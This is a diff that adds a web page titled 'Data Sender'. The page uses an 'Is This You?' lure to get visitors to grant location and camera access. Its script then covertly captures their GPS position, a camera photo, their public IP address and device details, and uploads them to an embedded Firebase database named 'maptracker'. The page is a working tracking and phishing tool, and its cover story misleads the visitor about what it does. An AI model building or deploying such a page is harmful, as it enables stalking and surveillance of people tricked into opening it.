@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Data Sender</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        h1 {
+            color: #00ff00;
+            margin-top: 20px;
+        }
+        #loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #ffffff;
+            justify-content: center;
+            align-items: center;
+            z-index: 999;
+        }
+        #loading-message {
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .container {
+            margin: 20px auto;
+            max-width: 400px;
+        }
+        .button {
+            background-color: #00cc00;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: background-color 0.3s;
+            width: 100%;
+        }
+        .button:hover {
+            background-color: #009900;
+        }
+        .error-message {
+            color: #ff0000;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div id="loading-screen">
+        <div id="loading-message">
+            <i class="fas fa-spinner fa-spin"></i> Sending data, please wait...
+        </div>
+    </div>
+    <div class="container">
+        <h1>Is This You?</h1>
+        <p>Please allow access to your location and camera for the best experience.</p>
+        <button class="button" id="start-button">Start Process</button>
+        <div id="error-message" class="error-message"></div>
+    </div>
+
+    <script type="module">
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyDGOfNv0d5SlEsq2LvOJZJEJSgANeswKd4",
+            authDomain: "maptracker-7afb6.firebaseapp.com",
+            databaseURL: "https://maptracker-7afb6-default-rtdb.firebaseio.com",
+            projectId: "maptracker-7afb6",
+            storageBucket: "maptracker-7afb6.appspot.com",
+            messagingSenderId: "874600101063",
+            appId: "1:874600101063:web:79d8010dee2bf0e57f7ae2",
+            measurementId: "G-HTXZEYZ3DK"
+        };
+
+        // Initialize Firebase
+        const { initializeApp } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js");
+        const { getDatabase, ref, set } = await import("https://www.gstatic.com/firebasejs/9.14.0/firebase-database.js");
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        const loadingScreen = document.getElementById('loading-screen');
+        const errorMessage = document.getElementById('error-message');
+
+        document.getElementById('start-button').addEventListener('click', startProcess);
+
+        async function startProcess() {
+            errorMessage.innerHTML = ''; // Clear previous errors
+            loadingScreen.style.display = 'flex'; // Show loading screen
+            
+            try {
+                // Request location permission and get the position
+                const position = await getLocation();
+                // Request camera permission and take a screenshot
+                const screenshot = await takeScreenshot();
+                // Uploading position and screenshot
+                await uploadData(position, screenshot);
+            } catch (error) {
+                errorMessage.innerHTML = error.message;
+            } finally {
+                loadingScreen.style.display = 'none'; // Hide loading screen
+            }
+        }
+
+        // Function to get location
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    return reject(new Error("Geolocation is not supported by your browser."));
+                }
+                navigator.geolocation.getCurrentPosition(resolve, reject);
+            });
+        }
+
+        // Function to take screenshot from camera
+        async function takeScreenshot() {
+            const video = document.createElement('video');
+            video.autoplay = true;
+
+            try {
+                // Access camera
+                video.srcObject = await navigator.mediaDevices.getUserMedia({ video: true });
+            } catch (error) {
+                throw new Error("Unable to access the camera.");
+            }
+
+            document.body.appendChild(video); // Append video to the body to access the stream
+
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0);
+                    video.srcObject.getTracks().forEach(track => track.stop()); // Stop the video stream
+                    document.body.removeChild(video); // Clean up the video element
+                    resolve(canvas.toDataURL('image/png')); // Return the screenshot as base64 string
+                }, 1000); // Take the screenshot after 1 second
+            });
+        }
+
+        // Function to upload data to Firebase
+        async function uploadData(position, screenshot) {
+            const dataRef = ref(database, 'users/' + Date.now());
+            await set(dataRef, {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                timestamp: Date.now(),
+                userAgent: navigator.userAgent,
+                deviceMemory: navigator.deviceMemory,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                screenResolution: `${screen.width}x${screen.height}`,
+                ipAddress: await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip),
+                language: navigator.language,
+                platform: navigator.platform,
+                screenshot: screenshot // Add screenshot data
+            });
+        }
+    </script>
+</body>
+</html>
